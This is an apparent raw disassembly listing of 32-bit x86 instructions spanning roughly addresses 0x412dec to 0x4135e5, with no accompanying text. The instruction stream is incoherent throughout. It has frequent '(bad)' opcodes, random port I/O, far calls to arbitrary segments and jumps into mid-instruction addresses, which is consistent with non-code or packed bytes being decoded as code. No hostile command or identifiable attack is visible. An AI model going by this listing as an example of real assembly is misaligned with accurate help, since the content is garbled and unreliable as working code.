  412dec:	outs   dx,BYTE PTR ds:[esi]
  412ded:	test   BYTE PTR [eax],dl
  412def:	ss push edx
  412df1:	retf   0x6add
  412df4:	xchg   ebp,eax
  412df5:	adc    al,0xf9
  412df7:	pop    esp
  412df8:	ud2    
  412dfa:	mov    al,0xa7
  412dfc:	sub    al,0xdb
  412dfe:	adc    al,0x6b
  412e00:	cmp    al,0x3c
  412e02:	lods   al,BYTE PTR ds:[esi]
  412e03:	test   al,0x91
  412e05:	mov    dl,0x8a
  412e07:	add    ah,al
  412e09:	sbb    DWORD PTR [eax+0x4ddd178a],ecx
  412e0f:	xchg   BYTE PTR [esi],ch
  412e11:	xor    DWORD PTR [esi],0xd7524a09
  412e17:	fild   QWORD PTR [edx+0xf0f5c12]
  412e1d:	loop   0x412e91
  412e1f:	(bad)  
  412e20:	outs   dx,DWORD PTR ds:[esi]
  412e21:	cmp    ecx,ebp
  412e23:	cmp    al,BYTE PTR [esi+0x40]
  412e26:	repz shl BYTE PTR [edx-0x3c],cl
  412e2a:	or     DWORD PTR [ebx+ebx*4-0x2b],ebx
  412e2e:	jg     0x412e52
  412e30:	mov    ebx,0x788780e7
  412e35:	or     DWORD PTR [ebp-0x5c],ecx
  412e38:	ins    DWORD PTR es:[edi],dx
  412e39:	xor    eax,0x33aec0e1
  412e3e:	in     al,0xca
  412e40:	out    dx,eax
  412e41:	xor    BYTE PTR [esi],bl
  412e43:	pop    ebx
  412e44:	call   0xb971b4be
  412e49:	out    0xa4,al
  412e4b:	popf   
  412e4c:	clc    
  412e4d:	aaa    
  412e4e:	sub    eax,ecx
  412e50:	add    cl,dl
  412e52:	or     BYTE PTR ds:0x94768044,dh
  412e58:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412e59:	(bad)  
  412e5a:	nop
  412e5b:	bound  ebp,QWORD PTR [ecx+edi*8+0x134822e9]
  412e62:	icebp  
  412e63:	adc    eax,0x8eeed960
  412e68:	xor    eax,0x248fc01b
  412e6d:	cs mov bh,0xf1
  412e70:	addr16 xor eax,0xa19f001e
  412e76:	jbe    0x412e63
  412e78:	adc    ebp,DWORD PTR [eax-0x2]
  412e7b:	adc    eax,DWORD PTR [edi+ecx*1]
  412e7e:	adc    DWORD PTR [ebx],ebp
  412e80:	jns    0x412f00
  412e82:	pop    esi
  412e83:	add    eax,DWORD PTR [ebp+ecx*1-0xd7322dd]
  412e8a:	pusha  
  412e8b:	stos   DWORD PTR es:[edi],eax
  412e8c:	mov    eax,ebx
  412e8e:	ret    
  412e8f:	inc    esi
  412e90:	cmp    BYTE PTR [edx-0x7df02384],0xab
  412e97:	lahf   
  412e98:	pushf  
  412e99:	inc    ebx
  412e9a:	rol    DWORD PTR [eax+0x18],1
  412e9d:	pop    ecx
  412e9e:	xor    eax,0xfae12b17
  412ea3:	sbb    ebp,0x7e
  412ea6:	fistp  QWORD PTR [esi+0x23]
  412ea9:	pop    ss
  412eaa:	sub    al,0xbc
  412eac:	pop    esi
  412ead:	sti    
  412eae:	pop    edi
  412eaf:	cdq    
  412eb0:	dec    DWORD PTR [edx-0x5403ee1c]
  412eb6:	scas   al,BYTE PTR es:[edi]
  412eb7:	(bad)  
  412eb8:	repz div DWORD PTR [edx+0x5b26e70d]
  412ebf:	sub    dl,BYTE PTR [ecx+edx*4+0x4cf72368]
  412ec6:	or     eax,0x33ecada5
  412ecb:	sbb    ebx,DWORD PTR [esi-0x4d76e4b3]
  412ed1:	cmc    
  412ed2:	adc    al,0x23
  412ed4:	mov    ds:0x60dd1246,al
  412ed9:	scas   al,BYTE PTR es:[edi]
  412eda:	je     0x412f4d
  412edc:	popa   
  412edd:	xor    eax,0x105a957e
  412ee2:	pusha  
  412ee3:	lods   eax,DWORD PTR ds:[esi]
  412ee4:	sbb    DWORD PTR [esi+0x161b100d],esp
  412eea:	std    
  412eeb:	xchg   BYTE PTR [esi-0x38186e51],cl
  412ef1:	mov    ds:0xe0dc0e51,al
  412ef6:	xchg   esi,eax
  412ef7:	(bad)  
  412ef8:	sar    DWORD PTR [ecx],cl
  412efa:	(bad)
  412efd:	adc    edx,DWORD PTR [ecx+0x3492df7e]
  412f03:	js     0x412e9d
  412f05:	fwait
  412f06:	sbb    al,0x85
  412f08:	test   bl,0x5a
  412f0b:	test   BYTE PTR [ebp+0x63],cl
  412f0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412f0f:	in     eax,dx
  412f10:	cli    
  412f11:	outs   dx,DWORD PTR ds:[esi]
  412f12:	xor    DWORD PTR [ebp-0x4e5b0096],ebx
  412f18:	test   BYTE PTR [esi-0x57383825],al
  412f1e:	dec    edi
  412f1f:	cmp    eax,DWORD PTR [eax-0x40]
  412f22:	pop    ebx
  412f23:	js     0x412f70
  412f25:	nop
  412f26:	(bad)  
  412f27:	mov    bh,0x5a
  412f29:	sbb    eax,DWORD PTR [eax+0x23]
  412f2c:	inc    ebp
  412f2d:	lahf   
  412f2e:	mov    DWORD PTR [edx],edx
  412f30:	lea    edi,[ebx-0x23ee6ac9]
  412f36:	mov    edx,0xaa80cca1
  412f3b:	dec    edx
  412f3c:	jmp    0x412f0f
  412f3e:	dec    ebx
  412f3f:	mov    BYTE PTR [eax-0x235e5bab],al
  412f45:	jecxz  0x412f23
  412f47:	aaa    
  412f48:	enter  0x6318,0xe
  412f4c:	adc    BYTE PTR [edx-0x24cdf5de],cl
  412f52:	int3   
  412f53:	dec    ecx
  412f54:	cmp    esi,DWORD PTR [esi]
  412f56:	rcl    DWORD PTR [ebx-0x23],cl
  412f59:	jge    0x412f52
  412f5b:	ds mov bh,0xd8
  412f5e:	mov    ds:0x4e24f315,eax
  412f63:	aad    0x86
  412f65:	sub    BYTE PTR [esi-0x4b],ah
  412f68:	xchg   ebp,eax
  412f69:	fsub   DWORD PTR [esi+0x6a]
  412f6c:	imul   ecx,DWORD PTR gs:[ebp+ebp*1+0x64],0x4b398d5f
  412f75:	jp     0x412ff5
  412f77:	ficom  WORD PTR [edi]
  412f79:	jmp    0x412f9b
  412f7b:	fist   DWORD PTR [edx-0x610a1783]
  412f81:	(bad)  
  412f82:	test   al,0xbb
  412f84:	xchg   esp,eax
  412f85:	mov    cl,0x9
  412f87:	repz sub edx,DWORD PTR [edi-0xcc274ee]
  412f8e:	add    BYTE PTR [ebx+0x78],0x31
  412f92:	inc    esp
  412f93:	mov    WORD PTR [ebp+edi*2-0x492614d2],?
  412f9a:	(bad)  
  412f9b:	cmp    ecx,ebp
  412f9d:	stos   BYTE PTR es:[edi],al
  412f9e:	aam    0x38
  412fa0:	push   ebp
  412fa1:	push   eax
  412fa2:	mov    es,edi
  412fa4:	dec    edi
  412fa5:	daa    
  412fa6:	push   esp
  412fa7:	push   edi
  412fa8:	stc    
  412fa9:	mov    ebx,0xcfc9d9d0
  412fae:	scas   al,BYTE PTR es:[edi]
  412faf:	lods   eax,DWORD PTR ds:[esi]
  412fb0:	inc    ecx
  412fb1:	div    DWORD PTR [ebp+0x1d565b2c]
  412fb7:	push   es
  412fb8:	push   0xffffffad
  412fba:	out    dx,eax
  412fbb:	mov    edx,0x1ff5d4eb
  412fc0:	push   ebx
  412fc1:	iret   
  412fc2:	adc    BYTE PTR [esi],0x96
  412fc5:	push   eax
  412fc6:	pop    ebp
  412fc7:	inc    ebx
  412fc8:	sti    
  412fc9:	push   es
  412fca:	jno    0x412f73
  412fcc:	fcom   st(1)
  412fce:	pop    ebp
  412fcf:	inc    ebp
  412fd0:	pushf  
  412fd1:	mov    WORD PTR [esi+edi*2],ds
  412fd4:	add    esi,DWORD PTR [edi+0x18]
  412fd7:	xor    esp,DWORD PTR [edi-0x7f8a5422]
  412fdd:	addr16 push edi
  412fdf:	idiv   esi
  412fe1:	pushf  
  412fe2:	pop    ebp
  412fe3:	retf   0x31fd
  412fe6:	jnp    0x412fec
  412fe8:	out    0xc6,al
  412fea:	daa    
  412feb:	das    
  412fec:	out    0xad,al
  412fee:	sub    al,BYTE PTR ds:0xd378efd
  412ff4:	daa    
  412ff5:	push   edx
  412ff6:	int    0x32
  412ff8:	xchg   DWORD PTR [ebx],esi
  412ffa:	sub    eax,0x2d597c7f
  412fff:	adc    al,0x9c
  413001:	or     eax,0xacf150c0
  413006:	add    eax,0xb0e8e814
  41300b:	or     eax,0x3974f926
  413010:	inc    eax
  413011:	jbe    0x413051
  413013:	dec    edx
  413014:	sar    BYTE PTR [edx+0x4ff73eef],0xe6
  41301b:	div    DWORD PTR [ecx+esi*8+0x5f]
  41301f:	call   0x95cb:0x3ca8edfc
  413026:	dec    ebp
  413027:	inc    esp
  413028:	pop    esi
  413029:	sti    
  41302a:	mov    ds:0x1b51a663,eax
  41302f:	mov    edi,0xb0932216
  413034:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413035:	in     eax,0xb6
  413037:	push   eax
  413038:	xlat   BYTE PTR ds:[ebx]
  413039:	adc    edi,ecx
  41303b:	mov    al,dh
  41303d:	mov    esi,0x5ccc5024
  413042:	cmp    ebx,DWORD PTR [eax]
  413044:	push   ecx
  413045:	sub    BYTE PTR [ebx],bh
  413047:	pusha  
  413048:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413049:	loop   0x4130c5
  41304b:	push   ss
  41304c:	out    0x4f,al
  41304e:	mov    ecx,0x9838ec26
  413053:	outs   dx,DWORD PTR ds:[esi]
  413054:	sub    esp,esi
  413056:	gs adc ah,bl
  413059:	test   al,0xfa
  41305b:	std    
  41305c:	jl     0x4130d6
  41305e:	call   0x1ad27376
  413063:	hlt    
  413064:	jg     0x412feb
  413066:	gs inc edx
  413068:	ret    
  413069:	fs dec ecx
  41306b:	mov    cl,0x82
  41306d:	pop    edi
  41306e:	adc    BYTE PTR [edi+0x3d],dh
  413071:	xchg   esp,eax
  413072:	jle    0x413060
  413074:	pop    edi
  413075:	sub    eax,0xaefe2120
  41307a:	shl    BYTE PTR [ebx],0x43
  41307d:	mov    ebp,0xc9e47cca
  413082:	out    dx,eax
  413083:	add    eax,DWORD PTR [ebx+0x13]
  413086:	arpl   WORD PTR [edi+0x46],dx
  413089:	retf   
  41308a:	leave  
  41308b:	xor    eax,0x26928558
  413090:	xor    eax,0x57469aad
  413095:	leave  
  413096:	cli    
  413097:	sub    esi,DWORD PTR [ecx]
  413099:	push   0x1f
  41309b:	out    0xc5,al
  41309d:	fnstsw WORD PTR [ecx+0x40]
  4130a0:	pop    es
  4130a1:	cs push ds
  4130a3:	sbb    eax,0x4c018987
  4130a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4130a9:	rol    BYTE PTR [esi],cl
  4130ab:	repz loopne 0x413081
  4130ae:	(bad)  
  4130af:	mov    ebx,0x3eb4e94a
  4130b4:	(bad)
  4130b7:	mov    esi,0xf24e132d
  4130bc:	and    eax,0x3ddffd46
  4130c1:	sbb    al,dh
  4130c3:	test   ah,bl
  4130c5:	xor    ecx,edi
  4130c7:	xchg   BYTE PTR [edx],cl
  4130c9:	or     eax,0xe8fa3fc0
  4130ce:	std    
  4130cf:	test   dl,dl
  4130d1:	cs je  0x413140
  4130d4:	into   
  4130d5:	or     BYTE PTR [eax+0x25],bh
  4130d8:	mov    al,ds:0x197b4c60
  4130dd:	fmul   QWORD PTR [ebx+0x45cab563]
  4130e3:	hlt    
  4130e4:	mov    ds:0xaf79ec9a,al
  4130e9:	data16 test al,0xc6
  4130ec:	push   ds
  4130ed:	dec    ebp
  4130ee:	jo     0x41315f
  4130f0:	pop    ecx
  4130f1:	rcl    DWORD PTR [edx+0x2b],0x2
  4130f5:	mov    ds:0x605a994e,al
  4130fa:	xchg   edi,eax
  4130fb:	jp     0x4130f4
  4130fd:	inc    edi
  4130fe:	xchg   DWORD PTR [edx-0x6b],edx
  413101:	and    DWORD PTR [ecx],edx
  413103:	mov    bh,0x19
  413105:	aad    0x7
  413107:	outs   dx,BYTE PTR ds:[esi]
  413108:	push   ebp
  413109:	enter  0x813d,0xc5
  41310d:	in     al,0x91
  41310f:	inc    esp
  413110:	call   0xebe2:0x9cc5878a
  413117:	fidivr WORD PTR [ebp-0x1e3bf6de]
  41311d:	sbb    eax,DWORD PTR [edi+0x3a]
  413120:	pop    edi
  413121:	rcr    BYTE PTR [esi],1
  413123:	mov    ah,BYTE PTR [edi-0x57]
  413126:	adc    eax,0x549be4cf
  41312b:	lock js 0x41311b
  41312e:	mov    esi,0x3f637862
  413133:	pusha  
  413134:	sub    eax,0x69db9dfe
  413139:	add    eax,eax
  41313b:	in     eax,0x20
  41313d:	mov    dl,0x6c
  41313f:	sub    ebp,DWORD PTR [eax+0x3a]
  413142:	or     DWORD PTR [edx-0x5b],0xffffffdc
  413146:	fsub   st(1),st
  413148:	lock and DWORD PTR [ecx+0x15bbbf00],eax
  41314f:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413151:	push   ebp
  413152:	xor    al,dl
  413154:	mov    edi,0x192ebd91
  413159:	or     al,0xb7
  41315b:	sbb    DWORD PTR [ebp-0x7dc481b5],esp
  413161:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413162:	std    
  413163:	add    al,0xaf
  413165:	sub    DWORD PTR [esi-0x18],0xb8b238a0
  41316c:	test   al,0x4b
  41316e:	(bad)  
  41316f:	mov    bh,bl
  413171:	sti    
  413172:	fcmovnb st,st(1)
  413174:	(bad)  
  413176:	mov    bh,BYTE PTR [eax]
  413178:	adc    eax,0xc56d3ff7
  41317d:	fucomp st(1)
  41317f:	popa   
  413180:	pop    esp
  413181:	(bad)  
  413182:	and    edi,DWORD PTR ds:[eax+eax*8+0x648bf9ac]
  41318a:	pop    ecx
  41318b:	into   
  41318c:	mov    al,ds:0x9a516b84
  413191:	(bad)  
  413192:	sub    eax,0xe0ad6e8c
  413197:	pop    eax
  413198:	sbb    ecx,DWORD PTR [edi-0xfe83db7]
  41319e:	loop   0x4131e4
  4131a0:	mov    ebx,0x5ac5fd80
  4131a5:	xor    BYTE PTR [edi-0x7],0xa9
  4131a9:	pop    esp
  4131aa:	mov    esi,0x66166be1
  4131af:	push   ss
  4131b0:	mov    ebp,eax
  4131b2:	sub    BYTE PTR [eax-0x42],bl
  4131b5:	mov    ?,edx
  4131b7:	fwait
  4131b8:	cdq    
  4131b9:	inc    esp
  4131ba:	les    edx,FWORD PTR [ebx]
  4131bc:	add    eax,0x7a9f9fa1
  4131c1:	out    dx,al
  4131c2:	dec    edx
  4131c3:	fstp   TBYTE PTR [edx+0xb]
  4131c6:	pop    ebx
  4131c7:	pop    esi
  4131c8:	push   ebp
  4131c9:	popf   
  4131ca:	ins    DWORD PTR es:[edi],dx
  4131cb:	fs dec eax
  4131cd:	and    DWORD PTR ds:0x514c506e,ecx
  4131d3:	or     al,0x80
  4131d5:	pop    edi
  4131d6:	dec    edi
  4131d7:	adc    bl,BYTE PTR [edx]
  4131d9:	or     ah,BYTE PTR ds:0x121767d5
  4131df:	js     0x413190
  4131e1:	repz dec esp
  4131e3:	popa   
  4131e4:	sbb    ebp,DWORD PTR [ebx-0x35f6807e]
  4131ea:	push   edi
  4131eb:	repnz adc esp,DWORD PTR [ecx-0x4d]
  4131ef:	addr16 jmp 0x7b10e654
  4131f5:	push   ebp
  4131f6:	repz mov cl,BYTE PTR [edx]
  4131f9:	mov    edx,0x573c34bd
  4131fe:	push   esp
  4131ff:	pop    eax
  413200:	sbb    eax,esp
  413202:	leave  
  413203:	push   edi
  413204:	mov    WORD PTR [ecx*4-0x7da97800],?
  41320b:	push   cs
  41320c:	xor    BYTE PTR [edi+esi*2+0x2],0x1c
  413211:	ficomp DWORD PTR [eax-0x196bbab3]
  413217:	ins    BYTE PTR es:[edi],dx
  413218:	push   ecx
  413219:	mov    dh,0xe2
  41321b:	not    dl
  41321d:	mov    ds:0xb793378e,eax
  413222:	ror    ecx,0xdf
  413225:	ror    BYTE PTR [edx+0x698b5b21],cl
  41322b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41322c:	rcr    DWORD PTR [eax+0x3c],cl
  41322f:	sbb    BYTE PTR [ecx],bl
  413231:	jb     0x41327d
  413233:	cmc    
  413234:	push   eax
  413235:	aad    0xdf
  413237:	mov    BYTE PTR [ebp-0xe],dh
  41323a:	cli    
  41323b:	loopne 0x413202
  41323d:	out    dx,eax
  41323e:	mov    ds:0x65e1e1f2,al
  413243:	and    DWORD PTR [eax],ebp
  413245:	ins    DWORD PTR es:[edi],dx
  413246:	cld    
  413247:	adc    eax,0x5b6ca414
  41324c:	test   BYTE PTR [edx+0xe],cl
  41324f:	enter  0x73f9,0xa
  413253:	ret    
  413254:	jmp    edi
  413256:	mov    ecx,0x610651e0
  41325b:	jnp    0x41321e
  41325d:	push   esi
  41325e:	into   
  41325f:	arpl   WORD PTR [edx+0x5a],bx
  413262:	aam    0xf8
  413264:	pop    eax
  413265:	lea    edx,[ebp+eiz*4+0x5dc89d38]
  41326c:	aam    0x1c
  41326e:	and    al,al
  413270:	or     edi,DWORD PTR [ebx+0x2bdf70f0]
  413276:	xor    eax,0xfd255d18
  41327b:	fprem  
  41327d:	dec    ebx
  41327e:	in     eax,dx
  41327f:	int3   
  413280:	ins    DWORD PTR es:[edi],dx
  413281:	popa   
  413282:	pusha  
  413283:	pop    ecx
  413284:	je     0x41325b
  413286:	int    0x2d
  413288:	pop    esp
  413289:	mov    al,ds:0x3f905e50
  41328e:	or     eax,0x77d8581e
  413293:	adc    DWORD PTR [ebp-0x6],edx
  413296:	sub    eax,0x4768dbde
  41329b:	js     0x413271
  41329d:	mov    ss,WORD PTR [edi]
  41329f:	movsx  edx,BYTE PTR [ecx+ebp*1+0x5e75e6d8]
  4132a7:	and    ecx,DWORD PTR [edx-0x3b]
  4132aa:	call   0x59df4e02
  4132af:	fmul   QWORD PTR [edx+0x2b628f70]
  4132b5:	mov    esp,0x96acf476
  4132ba:	test   eax,0xa112ce3c
  4132bf:	mov    edi,0x72b2f7dd
  4132c4:	sub    ebx,eax
  4132c6:	lahf   
  4132c7:	ds mov dh,0xba
  4132ca:	(bad)  
  4132cb:	mov    fs,WORD PTR [esi+0x7f]
  4132ce:	push   es
  4132cf:	lds    edi,FWORD PTR [ebp+0x707c1ae4]
  4132d5:	bound  edx,QWORD PTR [ebx]
  4132d7:	pop    edi
  4132d8:	mov    edx,0x955d82db
  4132dd:	pop    esi
  4132de:	cmp    eax,0x38f27863
  4132e3:	es sub al,0xb
  4132e6:	ret    
  4132e7:	adc    bl,ch
  4132e9:	jns    0x413363
  4132eb:	mov    dh,cl
  4132ed:	sub    BYTE PTR [ecx],cl
  4132ef:	ja     0x4132e7
  4132f1:	mov    ch,0xd4
  4132f3:	leave  
  4132f4:	cld    
  4132f5:	cmp    esp,edi
  4132f7:	in     eax,dx
  4132f8:	xchg   ebx,eax
  4132f9:	stos   BYTE PTR es:[edi],al
  4132fa:	mov    bl,BYTE PTR [ebp-0x288cc0bc]
  413300:	or     eax,0xe793e028
  413305:	adc    al,0x9
  413307:	jne    0x413359
  413309:	int    0x3c
  41330b:	dec    ebx
  41330c:	mov    bl,0xa1
  41330e:	icebp  
  41330f:	jb     0x413299
  413311:	push   ds
  413312:	imul   edi,DWORD PTR [edi+0x1e],0x9ab51ac5
  413319:	cmc    
  41331a:	jmp    0x6134:0x8524d59b
  413321:	xchg   ebx,eax
  413322:	(bad)  
  413323:	jge    0x413312
  413325:	outs   dx,BYTE PTR ds:[esi]
  413326:	mov    ch,0xd0
  413328:	push   es
  413329:	sub    bh,BYTE PTR [edi]
  41332b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41332c:	daa    
  41332d:	out    0x9a,eax
  41332f:	xchg   ebp,esi
  413331:	scas   al,BYTE PTR es:[edi]
  413332:	(bad)  
  413333:	xchg   esp,eax
  413334:	or     al,0x7c
  413336:	icebp  
  413337:	jns    0x413377
  413339:	or     eax,0x9de82bd6
  41333e:	mov    eax,0x181b458f
  413343:	ret    0x5c5c
  413346:	out    dx,eax
  413347:	(bad)
  41334a:	retf   
  41334b:	test   al,0x2a
  41334d:	jl     0x41334a
  41334f:	sbb    esp,esi
  413351:	das    
  413352:	pop    es
  413353:	xchg   ebp,eax
  413354:	mov    ebp,0x4f4d4426
  413359:	xlat   BYTE PTR ds:[ebx]
  41335a:	adc    al,0x9e
  41335c:	call   0xbb0d:0x680a0c5a
  413363:	cmp    al,0x61
  413366:	cdq    
  413367:	mov    eax,ds:0xd7f401f7
  41336c:	les    eax,FWORD PTR [edi-0x22]
  41336f:	sbb    al,0x13
  413371:	xchg   ebx,eax
  413372:	sub    BYTE PTR [ebx+ebx*2-0x7de438e],0x31
  41337a:	inc    esp
  41337b:	das    
  41337c:	xor    al,0x2c
  41337e:	add    DWORD PTR [eax],edi
  413380:	out    dx,al
  413381:	add    dl,BYTE PTR ds:0x2420147c
  413387:	iret   
  413388:	lock rcl DWORD PTR ds:0xaea7fabb,0xa1
  413390:	ror    BYTE PTR [esi+ebx*2],0x98
  413394:	and    ebx,DWORD PTR [ecx-0x33]
  413397:	loop   0x4133b1
  413399:	inc    edx
  41339a:	adc    ch,ch
  41339c:	sbb    esp,0xffffffb7
  41339f:	dec    ecx
  4133a0:	inc    eax
  4133a1:	test   al,0xa
  4133a3:	sub    ecx,DWORD PTR [ebx-0x30]
  4133a6:	sar    ch,0xf
  4133a9:	cmp    ebp,edx
  4133ab:	mov    ebp,0x538de3c8
  4133b0:	sar    DWORD PTR [ecx],0x8d
  4133b3:	xchg   edx,eax
  4133b4:	xor    DWORD PTR [ecx+0x52acdc29],0x12449222
  4133be:	xchg   edi,eax
  4133bf:	push   ds
  4133c0:	jns    0x413366
  4133c2:	xchg   edi,eax
  4133c3:	sub    eax,0xb787a52
  4133c8:	xchg   edi,eax
  4133c9:	(bad)  
  4133cb:	xor    BYTE PTR [edi+eiz*2-0x3637e482],0x51
  4133d3:	xchg   edx,eax
  4133d4:	pop    ss
  4133d5:	push   ds
  4133d6:	inc    ebp
  4133d7:	data16 sbb BYTE PTR [esi],ah
  4133da:	inc    eax
  4133db:	hlt    
  4133dc:	pushf  
  4133dd:	cmc    
  4133de:	(bad)  
  4133df:	and    ebp,edx
  4133e1:	ss mov edi,0x679c1df7
  4133e7:	mov    ecx,0xfb3c0bc0
  4133ec:	ret    0x98b
  4133ef:	cmp    edi,DWORD PTR [edx-0x582ac295]
  4133f5:	dec    edx
  4133f6:	test   BYTE PTR [eax+edx*4],ch
  4133f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4133fa:	pop    ds
  4133fb:	rol    cl,cl
  4133fd:	stc    
  4133fe:	stos   DWORD PTR es:[edi],eax
  4133ff:	add    esi,DWORD PTR [ecx-0x3713d29f]
  413405:	or     edx,DWORD PTR [ebx]
  413407:	adc    cl,BYTE PTR [esi-0x58f398a5]
  41340d:	add    al,0x3
  41340f:	xchg   edx,eax
  413410:	out    dx,eax
  413411:	sub    al,0xde
  413413:	and    al,0x4e
  413415:	fwait
  413416:	or     BYTE PTR [ebp+0x3a],al
  413419:	in     al,0x47
  41341b:	pop    ebx
  41341c:	mov    al,0xcf
  41341e:	sub    BYTE PTR [ebp+0x735c65d0],0x44
  413425:	retf   0x7080
  413428:	mov    bh,dl
  41342a:	(bad)  
  41342b:	jp     0x413483
  41342d:	(bad)  
  41342e:	dec    ebp
  41342f:	pushf  
  413430:	(bad)  
  413432:	cmp    dh,BYTE PTR [ebx]
  413434:	cld    
  413435:	adc    eax,0x9bacb442
  41343a:	push   eax
  41343b:	mov    ch,0xe8
  41343d:	mov    bl,0xfb
  41343f:	add    ebp,DWORD PTR [esi-0x1e]
  413442:	icebp  
  413443:	adc    al,0xcb
  413445:	pop    ds
  413446:	stc    
  413447:	sahf   
  413448:	mov    DWORD PTR [esi+0x9],ebx
  41344b:	clc    
  41344c:	sub    eax,0x3ba24e3e
  413451:	and    eax,0x85fe7ef8
  413456:	(bad)
  413459:	fwait
  41345a:	mov    eax,0x2b3e8937
  41345f:	out    0x9d,eax
  413461:	adc    edx,DWORD PTR [ebx]
  413463:	nop
  413464:	inc    ecx
  413465:	mov    al,ds:0x423fa190
  41346a:	ret    0x1828
  41346d:	cmp    eax,0x8ef48f7d
  413472:	pop    ecx
  413473:	and    BYTE PTR [ebx+0x3024ac21],0x2b
  41347a:	dec    edx
  41347b:	pop    ss
  41347c:	push   edi
  41347d:	jmp    0x413458
  41347f:	hlt    
  413480:	jbe    0x4134b4
  413482:	xchg   BYTE PTR [edx+0x5461d3a7],dh
  413488:	mov    DWORD PTR [esi-0x54],esp
  41348b:	test   al,0x90
  41348d:	rdpmc  
  41348f:	or     al,0xf5
  413491:	add    ah,bh
  413493:	sub    eax,0xa3b71d2c
  413498:	cmp    eax,0xbd9ce857
  41349d:	mov    ecx,0xd9ca6e40
  4134a2:	les    eax,FWORD PTR ds:0xdd1aa510
  4134a8:	xchg   ecx,eax
  4134a9:	mov    dl,0x14
  4134ab:	test   DWORD PTR [ebx-0x36],edx
  4134ae:	sub    eax,0x4a1a7347
  4134b3:	icebp  
  4134b4:	adc    ebp,esi
  4134b6:	into   
  4134b7:	test   eax,0x1f3c915c
  4134bc:	out    0xda,eax
  4134be:	shr    DWORD PTR [ecx],cl
  4134c0:	aaa    
  4134c1:	aam    0x44
  4134c3:	outs   dx,BYTE PTR ds:[esi]
  4134c4:	(bad)  
  4134c5:	in     al,dx
  4134c6:	dec    edi
  4134c7:	inc    edi
  4134c8:	fiadd  DWORD PTR [esi+0x54]
  4134cb:	or     al,0x35
  4134cd:	cmp    edx,DWORD PTR ds:0xbaaa88db
  4134d3:	ja     0x41353e
  4134d5:	pop    ss
  4134d6:	mov    ebx,0xed1f22f5
  4134db:	add    esi,DWORD PTR [ebp+edx*1+0x36]
  4134df:	push   ebp
  4134e0:	adc    eax,0xb1327710
  4134e5:	sub    DWORD PTR [esi+0x43],esi
  4134e8:	js     0x4134c7
  4134ea:	push   ebx
  4134eb:	push   eax
  4134ec:	push   edx
  4134ed:	(bad)  
  4134ee:	fld    TBYTE PTR [ecx+edx*2+0xd]
  4134f2:	jno    0x4134c6
  4134f4:	test   DWORD PTR fs:[eax+0x7fbc40c7],esp
  4134fb:	jno    0x41355a
  4134fd:	in     eax,dx
  4134fe:	dec    esp
  4134ff:	int    0xf6
  413501:	ins    WORD PTR es:[edi],dx
  413503:	cdq    
  413504:	and    ebp,0x51
  413507:	jno    0x41355a
  413509:	hlt    
  41350a:	jnp    0x413533
  41350c:	(bad)  
  41350d:	fld    TBYTE PTR [ecx-0x3c40ff73]
  413513:	leave  
  413514:	push   ecx
  413515:	jbe    0x41349f
  413517:	mov    al,ds:0xffb7e930
  41351c:	sbb    BYTE PTR [esp+ecx*8+0x3],0x4b
  413521:	js     0x4134b5
  413523:	push   ebx
  413524:	inc    edx
  413525:	jno    0x413534
  413527:	add    ecx,DWORD PTR [ebx]
  413529:	push   es
  41352a:	ss inc ecx
  41352d:	retf   
  41352e:	push   ds
  41352f:	jp     0x4134cb
  413531:	ror    bh,1
  413533:	repz pop ebx
  413535:	inc    edi
  413536:	shl    DWORD PTR [edx-0x299d5580],cl
  41353c:	mov    edx,0x33627079
  413541:	inc    eax
  413542:	jg     0x4134d3
  413544:	inc    edx
  413545:	hlt    
  413546:	adc    al,0x8f
  413548:	loopne 0x41354f
  41354a:	data16 jbe 0x413550
  41354d:	ret    0xc478
  413550:	fild   QWORD PTR [eax]
  413552:	mov    ?,WORD PTR [edx+ebp*1+0x58]
  413556:	dec    edi
  413557:	inc    esi
  413558:	bound  edi,QWORD PTR [edx-0x43]
  41355b:	dec    ecx
  41355c:	xlat   BYTE PTR ds:[ebx]
  41355d:	dec    ebx
  41355e:	ins    BYTE PTR es:[edi],dx
  41355f:	add    DWORD PTR [edi],edi
  413561:	mov    cl,0x7b
  413563:	hlt    
  413564:	or     eax,0xabb48a42
  413569:	stos   DWORD PTR es:[edi],eax
  41356a:	loopne 0x4134fe
  41356c:	sub    BYTE PTR [eax],0x8e
  41356f:	cdq    
  413570:	ds sti 
  413572:	or     BYTE PTR [edx+0x8],al
  413575:	aaa    
  413576:	int3   
  413577:	leave  
  413578:	fadd   DWORD PTR [edi+edx*2-0x6de97c02]
  41357f:	fiadd  WORD PTR [ebx+edx*4+0x3fe24e4f]
  413586:	xchg   esi,eax
  413587:	or     ah,BYTE PTR [ebp-0x50494f8b]
  41358d:	sti    
  41358e:	push   0x29d7e6a9
  413593:	and    eax,0x61774395
  413598:	stos   BYTE PTR es:[edi],al
  413599:	add    DWORD PTR [edi],esi
  41359b:	jmp    0x4135b6
  41359d:	pop    ds
  41359e:	xor    BYTE PTR [esi],bl
  4135a0:	dec    ecx
  4135a1:	jp     0x4135d2
  4135a3:	mov    esp,0xe48bef5
  4135a8:	outs   dx,DWORD PTR ds:[esi]
  4135a9:	xor    al,0x34
  4135ab:	popf   
  4135ac:	fbld   TBYTE PTR ds:0x454302c0
  4135b2:	mov    esi,0xcc95d6c4
  4135b7:	enter  0xc631,0xe2
  4135bb:	xchg   ecx,eax
  4135bc:	cmc    
  4135bd:	and    ah,BYTE PTR [edi-0x26]
  4135c0:	shl    BYTE PTR [edi*2-0x498703b8],cl
  4135c7:	push   eax
  4135c8:	mov    cl,0x6
  4135ca:	clc    
  4135cb:	mov    edi,0xe58ceeb4
  4135d0:	cmp    DWORD PTR [eax],edi
  4135d2:	mov    bl,0x19
  4135d4:	retf   0x91a2
  4135d7:	sahf   
  4135d8:	and    al,0xbe
  4135da:	xchg   esp,eax
  4135db:	mov    gs,WORD PTR [edx+0x79]
  4135de:	inc    ebx
  4135df:	test   DWORD PTR [esi],eax
  4135e1:	(bad)  
  4135e3:	aam    0xaa
  4135e5:	lahf   
